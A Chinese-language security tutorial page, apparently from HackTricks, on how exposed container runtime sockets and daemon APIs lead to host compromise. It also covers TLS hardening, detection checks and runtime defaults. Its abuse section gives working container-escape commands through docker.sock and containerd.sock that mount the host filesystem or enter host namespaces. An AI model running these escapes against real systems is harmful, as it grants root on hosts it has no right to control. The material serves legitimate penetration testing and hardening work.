# 运行时 API 与 守护进程暴露

{{#include ../../../banners/hacktricks-training.md}}

## 概述

许多真实的容器入侵并不以 namespace 越狱开始。它们是从访问运行时控制平面开始的。如果一个工作负载能通过挂载的 Unix socket 或暴露的 TCP 监听器与 `dockerd`, `containerd`, CRI-O, Podman, 或 kubelet 通信，攻击者可能能够请求一个具有更高权限的新容器、挂载主机文件系统、加入主机命名空间，或检索敏感的节点信息。在这些情况下，运行时 API 才是真正的安全边界，破坏它在功能上与破坏主机几乎等同。

这就是为什么运行时 socket 暴露应当与内核防护分开记录的原因。即使容器有常规的 seccomp、capabilities 和 MAC confinement，如果其内部挂载了 `/var/run/docker.sock` 或 `/run/containerd/containerd.sock`，仍然可能只需一次 API 调用就能导致主机被攻破。当前容器的内核隔离可能完全按设计工作，而运行时管理平面则仍然完全暴露。

## 守护进程访问模型

Docker Engine 传统上通过本地 Unix socket 在 `unix:///var/run/docker.sock` 暴露其特权 API。历史上它也曾通过诸如 `tcp://0.0.0.0:2375` 的 TCP 监听器或在 `2376` 上的 TLS 保护监听器暴露到远程。若在没有强 TLS 和客户端认证的情况下远程暴露守护进程，实际上会把 Docker API 变成一个远程 root 接口。

containerd, CRI-O, Podman, 和 kubelet 暴露了类似的高影响面。名称和工作流程可能不同，但逻辑相同。如果该接口允许调用方创建工作负载、挂载主机路径、检索凭据或修改正在运行的容器，那么该接口就是一个特权管理通道，应相应对待。

值得检查的常见本地路径包括：
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
较旧或更专业的栈也可能暴露诸如 `dockershim.sock`、`frakti.sock` 或 `rktlet.sock` 之类的端点。这些在现代环境中不太常见，但一旦遇到应以同样的谨慎对待，因为它们代表的是运行时控制面（runtime-control surfaces），而不是普通的应用套接字。

## 安全的远程访问

如果必须将守护进程暴露到本地套接字之外，应使用 TLS 保护连接，最好使用双向认证（mutual authentication），以便守护进程验证客户端，客户端也验证守护进程。为了方便而在明文 HTTP 上开放 Docker daemon 的旧习惯，是容器管理中最危险的错误之一，因为 API 面足以直接创建特权容器。

历史上 Docker 的配置模式如下所示：
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
在基于 systemd 的主机上，daemon 的通信也可能以 `fd://` 的形式出现，这意味着进程从 systemd 继承了一个预先打开的 socket，而不是自己直接绑定它。重要的教训不是精确的语法，而是安全后果。一旦 daemon 在超出严格权限控制的本地 socket 之外监听，传输安全（transport security）和客户端认证（client authentication）就变成了必须的，而不是可选的加固措施。

## 滥用

如果存在 runtime socket，确认它是哪一个，是否存在兼容的客户端，以及是否可以进行 raw HTTP 或 gRPC 访问：
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
这些命令很有用，因为它们可以区分无效路径、已挂载但不可访问的 socket，以及可用的具有特权的 API。如果 client 成功，接下来的问题是该 API 是否能够启动一个新的 container 并使用 host bind mount 或 host namespace sharing。

### 完整示例: Docker Socket To Host Root

如果 `docker.sock` 是可访问的，经典的 escape 是启动一个新的 container，将主机根文件系统挂载进去，然后 `chroot` 进入：
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
这通过 Docker daemon 提供了直接以主机 root 权限执行的能力。影响不仅限于读取文件。一旦进入新的 container，攻击者可以修改主机文件、窃取凭证、植入持久化后门，或启动额外的特权工作负载。

### Full Example: Docker Socket To Host Namespaces

如果攻击者更倾向于进入 namespace 而不是仅限于文件系统访问：
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
这条路径通过向 runtime 请求创建一个具有明确 host-namespace 暴露的新 container 来到达主机，而不是通过利用当前的 container。

### 完整示例: containerd Socket

挂载的 `containerd` socket 通常同样危险：
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
影响仍然是 host compromise。

即使缺少 Docker 特定的工具，其他运行时 API 仍可能提供相同的管理权限。

## Checks

这些检查的目的是判断 container 是否能够访问任何本应位于信任边界之外的管理平面。
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
What is interesting here:

- 挂载的运行时套接字通常是一个直接的管理原语，而不仅仅是信息泄露。
- 在没有 TLS 的情况下在端口 `2375` 上监听的 TCP 服务应被视为远程妥协条件。
- 环境变量如 `DOCKER_HOST` 常常表明该工作负载是刻意设计用于与宿主机运行时通信的。

## 运行时默认值

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | 默认使用本地 Unix 套接字 | `dockerd` 在本地套接字上监听，守护进程通常以 root 权限运行 | 挂载 `/var/run/docker.sock`、暴露 `tcp://...:2375`、在 `2376` 上 TLS 弱或缺失 |
| Podman | 默认无守护进程的 CLI | 普通本地使用不需要长期运行的特权守护进程；当启用 `podman system service` 时，API 套接字仍可能被暴露 | 暴露 `podman.sock`、广泛运行该服务、以 root 权限使用 API |
| containerd | 本地特权套接字 | 通过本地套接字暴露管理 API，通常被更高层工具消费 | 挂载 `containerd.sock`、广泛的 `ctr` 或 `nerdctl` 访问、暴露特权命名空间 |
| CRI-O | 本地特权套接字 | CRI 端点旨在供节点本地受信任组件使用 | 挂载 `crio.sock`、向不受信任的工作负载暴露 CRI 端点 |
| Kubernetes kubelet | 节点本地管理 API | Kubelet 不应被 Pods 广泛访问；访问可能根据 authn/authz 泄露 pod 状态、凭证和执行功能 | 挂载 kubelet 套接字或证书、弱的 kubelet 认证、主机网络加上可达的 kubelet 端点 |
{{#include ../../../banners/hacktricks-training.md}}
